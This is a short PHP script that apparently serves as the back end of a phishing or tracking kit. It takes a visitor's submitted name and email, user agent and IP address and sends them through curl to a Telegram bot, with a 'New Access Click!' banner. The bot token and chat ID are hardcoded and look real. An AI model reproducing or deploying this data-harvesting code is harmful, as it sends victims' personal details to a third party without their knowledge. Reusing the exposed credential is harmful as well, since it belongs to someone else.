<?php 
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $fullName = $_POST['fullName'] ?? 'Unknown';
    $email = $_POST['email'] ?? 'No Email';
    $userAgent = $_POST['userAgent'] ?? 'Unknown';
    $dateTime = $_POST['dateTime'] ?? date("Y-m-d H:i:s");
    $ipAddress = $_SERVER['REMOTE_ADDR'];

    // Telegram bot credentials
    $botToken = "7933190828:AAFmz7cPqu3QsydZLfayIUsUorP8pbr-qh0"; // Replace with your bot token
    $chatId = "1483014500"; // Replace with your chat ID

    $message = "🦾 *Legendary Erujeje!* 🔥\n\n" .
               "🚀 *New Access Click!* \n\n" .
               "👤 *Name:* $fullName \n" .
               "📧 *Email:* $email \n" .
               "🌍 *IP Address:* $ipAddress \n" .
               "🖥 *User Agent:* $userAgent \n" .
               "📅 *Date & Time:* $dateTime";

    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
    
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    echo "success";
} else {
    echo "error";
}
?>
